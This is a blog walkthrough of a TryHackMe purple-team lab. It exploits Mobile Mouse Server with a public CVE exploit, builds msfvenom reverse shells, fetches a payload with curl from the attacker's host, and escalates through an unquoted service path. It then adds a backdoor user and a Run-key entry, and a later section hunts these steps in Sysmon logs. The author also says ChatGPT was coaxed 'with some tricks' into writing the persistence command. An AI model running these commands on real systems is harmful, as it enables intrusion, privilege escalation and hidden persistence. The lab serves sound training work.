## Intro

I recommend checking out the room yourself.

This is a purple TryHackMe Room, <https://tryhackme.com/r/room/mousetrap>.

## Jom and Terry Go Purple - Red Part

### Description
> In the world of cyber security, we often talk about a game of cat and mouse.  
> 
> Follow the adventures of Jom and Terry, members of the TryMouseMe purple team, as they work through a thrilling exercise of Attack and Defense. From initial access to persistence, you will emulate a three-stage attack on a Windows environment.  
> 
> Attack Emulation VM  
> 
> Click the green `Start Machine` button to start the machine above.
> 
> **Please give the VM 5 minutes to boot up.**

### Initial enumeration &  Exploit

I usually start with a `nmap` scan which scans all the ports, I activate the double verbose (`-vv`) function that I can check out the ports while the scan is running.

```sh
sudo nmap -p- -sV -sC -oA nmap/machine -vv 10.10.153.187
```

We get these results (I removed some not important information):
```

```

So there is a application named `Mobile Mouse Server` installed on the server. Normally I would check the version of the application, but this time I simply searched for an exploit fo this server application.

![](/assets/blog/Mouse-Trap/Google1.png)

Indeed there is a exploit right at the top of the Google results <https://github.com/blue0x1/mobilemouse-exploit>, I read the first few lines and found out that there are two versions for the exploit one uses SMB the other HTTP. If you remember, this information matches the instructions. So let's dive deeper. I downloaded the exploit.

![](/assets/blog/Mouse-Trap/github.png)

The next step is to generate a nice reverse shell like in the Engagement details said, a **Windows stageless reverse TCP (x64) shell** named `shell.exe`. I used `msfvenom` for that, it's an fast and easy way to do it.:

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.14.78.229 LPORT=4444 -f exe -o shell.exe
```

By executing the exploit with the target IP, the file name and the local IP address we should be able to get a reverse shell. Before executing the exploit you must start a listener (`nc -lvnp 4444`).

```sh
sudo python3 CVE-2023-31902-v2.py --target 10.10.68.242 --file shell.exe --lhost 10.14.78.229
```

After a few seconds I get the connection from the server. The `whoami` command reveals that we are *purpletom*, the local user.

![](/assets/blog/Mouse-Trap/shell.png)

If you navigate to the home directory of the user *purpletom*, we can find the `SharpUp.exe` and the flag:
```powershell
cd C:\Users\purpletom
```
...you can retrive the user flag with `type`. I recommend switching to `powershell` because powershell is much more usable then the `cmd`. In addition to that for me as a linux guy it's much easier to navigate around with `ls`, `cat` and the familiar linux commands.

### Privilege escalation

Now let's start escalating our privileges using the mentioned methods in the engagement specifications:

>  - Use SharpUp.exe for enumeration, located in C:\Users\purpletom
>  - Target the Mobile Mouse directory while executing the unquoted service path abuse

I started looking to my docs and the internet for how to use [`SharpUp.exe`](https://github.com/GhostPack/SharpUp). This tool will check for scheduled tasks with paths that are hijackable. I found the man page on GitHub and we can simply run the executable with the `audit` argument, this will check every vulnerability.

```powershell
.\SharpUp.exe audit
```

... we get the results that the `Mobile Mouse Service` is vulnerable to privilege escalation.
![](/assets/blog/Mouse-Trap/sharp.png)

Now the two things to check is:

1. To which directory has the user *purpletom* write permission?
2. How can we start the scheduled task.


If we inspect the service we see that we can start it on demand.
```
PS C:\Users\purpletom> sc.exe qc 'Mobile Mouse Service'
sc.exe qc 'Mobile Mouse Service'
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: Mobile Mouse Service
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\Mobile Mouse\Mouse Utilities\HelperService.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Mobile Mouse Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

One of the directories in the service path is writable to us so we can upload our own binary to exploit it.
```
icacls 'C:\Program Files (x86)\Mobile Mouse'
C:\Program Files (x86)\Mobile Mouse BUILTIN\Users:(W)
                                    NT SERVICE\TrustedInstaller:(I)(F)
                                    NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                    NT AUTHORITY\SYSTEM:(I)(F)
                                    NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                    BUILTIN\Administrators:(I)(F)
                                    BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                    BUILTIN\Users:(I)(RX)
                                    BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                    CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                                    APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                    APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
                                    APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
                                    APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files
```

I now created a second shell that I could upload it and use it for a listener for the root shell.
```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.14.78.229 LPORT=6666 -f exe -o shell2.exe
```
With starting a web server:

```sh
sudo python3 -m http.server 80
```

I downloaded the second shell to the location we have write permissions to:
```powershell
curl -o 'C:\Program Files (x86)\Mobile Mouse\Mouse.exe' http://10.14.78.229/shell2.exe
```

Now the last step to get the reverse listener back is to start the scheduled task.

```powershell
sc.exe start 'Mobile Mouse Service'
```

![](/assets/blog/Mouse-Trap/whoami.png)

Let's move to the administrators directory and get the flag:
```powershell
cd C:\Users\Administrator
cd Desktop
type root.txt
```

### Persistance

The last part of the challenge is establishing persistance.

> - Use the `HKEY_CURRENT_USER` registry hive
> - Use the `SYSTEM user` when creating the run key persistence
> - Specify the registry key name (`shell`)
> - Use the following path for the payload (`C:\Windows\Temp\shell.exe`)
> - Specify the name of the backdoor user (`terry`)

Let's first create a user `terry`.

```powershell
net user terry nojoke123!!! /add
```

The next step is tp create the persistance mechanism in the registry using the `Run` key.

Don't worry if you also cant remember commands, I asked ChatGPT if he could build this command, with some tricks it returned me the registry edit command:

```
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v shell /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
```

Finally for retrieving the flag run the checker binary on the Desktop.
```powershell
.\checker.exe
```

This was the first part, which already was pretty nice.

## Time to Catch Terry

The first part of this challenge is extracting the **Sysmon** logs into a readable csv file, for that, you can follow the instructions on the site and run this command:
```powershell
.\EvtxECmd.exe -f "C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx" --csv $HOME/Desktop --csvf Sysmon.csv
```

I personally use Timeline explorer now because I'm familiar with it and it has these nice search functionalities. I now opened the file there and started searching around, I first searched for `powershell.exe`, because this is usually called when a payload is executed.

![](/assets/blog/Mouse-Trap/powershell.png)

With the file name and the IP we can answer the first two questions.
Next let's search for the command that executed the payload there we can use the file name of the payload to find the payload.

![](/assets/blog/Mouse-Trap/powershell1.png)

> What is the full command-line of the tool used to enumerate the privilege escalation vectors?

This is the next question, as we already know we used `SharpUp` to find the privilege escalation exploit, let's search for that to find the command.

![](/assets/blog/Mouse-Trap/powershell2.png)

For the 6th question we can search for the name of the file we used to name our root shell `Mouse.exe` (because of the unquoted path the file must have that name.)

![](/assets/blog/Mouse-Trap/powershell3.png)

This was a tricky question but after some searching through Mouse matches I found this command:

![](/assets/blog/Mouse-Trap/powershell4.png)

The last part is the persistance step which we did too. Here we need to find the user created and the registry key which was modified to get the shell for the first, I searched `net user /add` and got the command used.

![](/assets/blog/Mouse-Trap/powershell5.png)

For the last two questions I searched for `reg add Run` as a prompt because we know that we need to modify a run key, with that we are able to answer the final questions.

## Conclusion

I really like the semi-guided way the room was done, although it was a easy room I liked it. What I liked the most, is that we need to apply our knowledge gained in the red team part to investigate the blue team part.
